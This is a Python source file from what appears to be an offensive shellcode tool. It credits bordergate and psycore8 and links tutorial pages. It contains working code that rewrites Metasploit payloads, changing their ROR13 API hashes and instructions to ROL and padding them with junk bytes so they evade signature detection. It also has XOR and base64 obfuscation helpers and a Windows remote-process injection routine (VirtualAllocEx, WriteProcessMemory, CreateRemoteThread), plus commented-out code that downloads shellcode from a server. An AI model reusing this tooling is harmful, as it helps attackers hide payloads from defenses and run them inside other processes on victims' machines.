"""
ror2rol:
https://www.bordergate.co.uk/function-name-hashing/

xor:
https://www.stackzero.net/how-to-easily-encrypt-file-in-python/

inject:
https://systemweakness.com/win32api-with-python3-part-iii-injection-6dd3c1b99c90

"""

import pefile
import utils.arg
import os
import base64
import ctypes, sys
from capstone import *
from shencode import nstate
from itertools import cycle

class ror2rol:
  Author = 'bordergate, psycore8'
  Description = 'change ROR13 to ROL encoding in metasploit payloads'
  Version = '1.0.0'
  hash_dict = dict()

  def init():
    spName = 'ror2rol'
    spArgList = [
          ['-i', '--input', '', '', 'Input file for ROR13 to ROL conversion'],
          ['-o', '--output', '', '', 'Outputfile for ROR13 to ROL conversion'],
          ['-k', '--key', '', '', 'Key to process ROR13 to ROL']
        ]
    utils.arg.CreateSubParser(spName, ror2rol.Description, spArgList)


  def lookup_functions(dll_path):
    pe = pefile.PE(dll_path)
    export_dir = pe.OPTIONAL_HEADER.DATA_DIRECTORY[pefile.DIRECTORY_ENTRY['IMAGE_DIRECTORY_ENTRY_EXPORT']]
    for exp in pe.DIRECTORY_ENTRY_EXPORT.symbols:
      if exp.name:
        function_name = exp.name.decode()
        dll_name = os.path.basename(dll_path)
        hash = ror2rol.calculate_hash(dll_name, function_name, 13, "ror")
        ror2rol.hash_dict[hash] = dll_name + '!' + function_name
 
  def ror(dword, bits):
    return ((dword >> (bits%32)) | (dword << (32-(bits%32)))) & 0xffffffff
 
  def rol(dword, bits):
    return ((dword << (bits%32)) | (dword >> (32-(bits%32)))) & 0xffffffff
 
  def unicode(string, uppercase=True):
    result = ''
    if uppercase:
        string = string.upper()
    for c in string:
        result += c + '\x00'
    return result
 
  def calculate_hash(module, function, bits, hash_type):
    module_hash = 0
    function_hash = 0
    for c in ror2rol.unicode(module + '\x00'):
        if hash_type == "ror":
            module_hash = ror2rol.ror(module_hash, bits)
        if hash_type == "rol":
            module_hash = ror2rol.rol(module_hash, bits)
        module_hash += ord(c)
    for c in function + '\x00':
        if hash_type == "ror":
            function_hash = ror2rol.ror(function_hash, bits)
        if hash_type == "rol":
            function_hash = ror2rol.rol(function_hash, bits)
        function_hash += ord(c)
    hash = module_hash + function_hash & 0xFFFFFFFF
    return hash
 
  def check_shellcode(shellcode, pattern):
    byte_data = pattern.to_bytes(4, 'big')
    reversed_bytes = byte_data[::-1]
    index = shellcode.find(reversed_bytes)
    return index
 
  def replace_bytes_at_offset(data, offset, new_bytes):
    data = bytearray(data)
    end_offset = offset + len(new_bytes)
    data[offset:end_offset] = new_bytes
    return bytes(data)
 
  def highlight_byte_changes(original_bytes, modified_bytes):
    highlighted = []
    for original, modified in zip(original_bytes, modified_bytes):
        if original == modified:
            highlighted.append(f"\\x{original:02X}")
        else:
            highlighted.append(f"\\x{original:02X} -> \\x{modified:02X}")
    return "".join(highlighted)
 
  def find_ror_instructions(data, search_bytes):
    occurrences = []
    index = 0
    while True:
        try:
            index = data.index(search_bytes, index)
            occurrences.append(index)
            index += 1
        except ValueError:
            break
    return occurrences
 
  def process_shellcode(shellcode,ror_key):
    new_shellcode = shellcode
 
    for key,value in ror2rol.hash_dict.items():
        index = ror2rol.check_shellcode(shellcode, key)
        if index != -1:
            print(f'{nstate.OKGREEN} 0x%08X = %s offset: %s' % (key, value, index))
            dll_name = value.split('!')[0]
            function_name = value.split('!')[1]
            hash = ror2rol.calculate_hash(dll_name, function_name, ror_key, "rol")
            print(f'{nstate.OKGREEN}New value: 0x%08X' % (hash))
            byte_data = hash.to_bytes(4, 'big')
            reversed_bytes = byte_data[::-1]
            new_shellcode = ror2rol.replace_bytes_at_offset(new_shellcode, index, reversed_bytes)
            hex_string = ''.join('\\x{:02X}'.format(byte) for byte in new_shellcode)
 
    print(f"{nstate.OKGREEN} Changing ROR key")
    
    # \xC1\xCF\x0D ror edi,D

    ror_instances = ror2rol.find_ror_instructions(new_shellcode,b"\xC1\xCF\x0D")
    for ror_offset in ror_instances:
        bytes_key = ror_key.to_bytes(1, 'big')
        # We're replacing the ROR with a ROL here. ROR = \xC1\xCF\x0D  ROL = \xC1\xC7\+byte_key
        new_shellcode = ror2rol.replace_bytes_at_offset(new_shellcode, ror_offset, b"\xC1\xC7" + bytes_key )
         
    return new_shellcode
  
  # def process(dll_paths, filename, out_file, showmod, decompile, ror_key):
  def process(dll_paths, filename, out_file, ror_key):
    for dll in dll_paths:
      ror2rol.lookup_functions(dll)
    # Read existing shellcode
    print(f"{nstate.OKGREEN} Reading shellcode")
    try: 
      with open(filename, "rb") as file:
        shellcode = file.read()
    except FileNotFoundError:
        print(f"{nstate.FAIL} File not found or cannot be opened.")
        exit()
 
    new_shellcode = ror2rol.process_shellcode(shellcode,int(ror_key))
 
    # Add some NOP's
    position = 1
    bytes_to_insert = b"\xFF\xC0\xFF\xC8" * 5  # INC EAX, DEC EAX
    modified_shellcode = new_shellcode[:position] + bytes_to_insert + new_shellcode[position:]
  
    #if showmod:
      #print(f"{nstate.OKGREEN} Modifications")
      #highlighted_changes = ror2rol.highlight_byte_changes(shellcode, modified_shellcode)
      #print(highlighted_changes)
 
    print(f"{nstate.OKBLUE} Shellcode size: " + str(len(modified_shellcode)))
    """
    if verbose:
      print(f"{nstate.OKGREEN} Final shellcode (C++)")
      hex_string = ''.join('\\x{:02X}'.format(byte) for byte in modified_shellcode)
      print(hex_string)
      print(f"{nstate.OKGREEN} Final shellcode (C#)")
      hex_string = ''.join('0x{:02X},'.format(byte) for byte in modified_shellcode)
      print(hex_string[:-1])
    """
    outputfile = out_file
    print(f"{nstate.OKBLUE} Writing bytes to file: {outputfile}")
    with open(outputfile, 'wb') as file:
      file.write(modified_shellcode)
    path = outputfile
    cf = os.path.isfile(path)
    if cf == True:
      print(f"{nstate.OKGREEN} encoded shellcode created in {outputfile}")
    else:
      print(f"{nstate.FAIL} encoded Shellcode error, aborting script execution")
      exit()
 
    #if decompile:
      #print(f"{nstate.OKGREEN} ASM Code")
      #md = Cs(CS_ARCH_X86, CS_MODE_64)
      #for i in md.disasm(modified_shellcode, 0x1000):
        #print("0x%x:\t%s\t%s\t%s" %(i.address, ' '.join('{:02x}'.format(x) for x in i.bytes), i.mnemonic, i.op_str))
        
#xor migrated
class xor:
   def xor_crypt_string(data, key, encode = False, decode = False):
     if decode:
      data_bytes = base64.b64decode(data)
      data = data_bytes.decode("utf-8")
     xored = ''.join(chr(ord(x) ^ ord(y)) for (x,y) in zip(data, cycle(key)))
   
     if encode:
       data_bytes = base64.b64encode(xored.encode("utf-8"))
       return data_bytes.decode("utf-8")
     return xored
   
   def xor_crypt_bytes(data, key):
    out = [x ^ key for x in data]
    print(out)
    return bytes(out)
   
class inject:
  if os.name == 'nt':
    from ctypes import windll
    from ctypes import wintypes
    from urllib import request
    from time import sleep
    import wmi
    import argparse
    import threading

  Target_Process = ''
  Shellcode = ''
  StartProcess = False
  def Start_Process():
    tp = inject.Target_Process
    print(f'{nstate.OKBLUE} starting {tp}')
    os.system(tp)

  def get_proc_id():
    processes = inject.wmi.WMI().Win32_Process(name=inject.Target_Process)
    
    pid = processes[0].ProcessId
    print(f"{nstate.OKGREEN} {inject.Target_Process} process id: {pid}")
    
    return int(pid)
    
    # response = request.urlopen(args.server)
    # shellcode = response.read()

    # if shellcode:
    #   print(f'[*] retrieved the shellcode from {args.server}')

  def start_injection():
    if inject.StartProcess:
      s = inject.threading.Thread(target=inject.Start_Process)
      s.start()
      inject.sleep(3)
    kernel32 = inject.windll.kernel32
    # constants
    MEM_COMMIT_RESERVE = 0x3000
    PAGE_READWRITE_EXECUTE = 0x40
    PROCESS_ALL_ACCESS = 0x1fffff
    EXECUTE_IMMEDIATLY = 0

    # Function type redefintions
    OpenProcess = kernel32.OpenProcess
    OpenProcess.argtypes = [inject.wintypes.DWORD,inject.wintypes.BOOL,inject.wintypes.DWORD]
    OpenProcess.restype = inject.wintypes.HANDLE

    VirtualAllocEx = kernel32.VirtualAllocEx
    VirtualAllocEx.argtypes = [inject.wintypes.HANDLE, inject.wintypes.LPVOID, ctypes.c_size_t, inject.wintypes.DWORD,inject.wintypes.DWORD]
    VirtualAllocEx.restype = inject.wintypes.LPVOID

    WriteProcessMemory = kernel32.WriteProcessMemory
    WriteProcessMemory.argtypes = [inject.wintypes.HANDLE, inject.wintypes.LPVOID, inject.wintypes.LPCVOID, ctypes.c_size_t, inject.wintypes.LPVOID]
    WriteProcessMemory.restype = inject.wintypes.BOOL

    CreateRemoteThread = kernel32.CreateRemoteThread
    CreateRemoteThread.argtypes = [inject.wintypes.HANDLE, inject.wintypes.LPVOID, ctypes.c_size_t, inject.wintypes.LPVOID, inject.wintypes.LPVOID, inject.wintypes.DWORD, inject.wintypes.LPDWORD]
    CreateRemoteThread.restype = inject.wintypes.HANDLE

    CloseHandle = kernel32.CloseHandle
    CloseHandle.argtypes = [inject.wintypes.HANDLE]
    CloseHandle.restype = inject.wintypes.BOOL
    process_id = inject.get_proc_id()

    phandle = OpenProcess(PROCESS_ALL_ACCESS, False, process_id)
    if phandle:
      print(f"{nstate.OKGREEN} Opened a Handle to the process")

    memory = VirtualAllocEx(phandle, None, len(inject.Shellcode), MEM_COMMIT_RESERVE, PAGE_READWRITE_EXECUTE)
    if memory:
      print(f'{nstate.OKGREEN} Allocated Memory in the process')

    c_null = ctypes.c_int(0)
    writing = WriteProcessMemory(phandle, memory, inject.Shellcode, len(inject.Shellcode), ctypes.byref(c_null))
    if writing:
      print(f'{nstate.OKGREEN} Wrote The shellcode to memory')

    Injection = CreateRemoteThread(phandle, None, 0, memory, None, EXECUTE_IMMEDIATLY, None)

    if Injection:
      print(f'{nstate.OKGREEN} Injected the shellcode into the process')
      CloseHandle(phandle)

  def proc_inject():
     return False
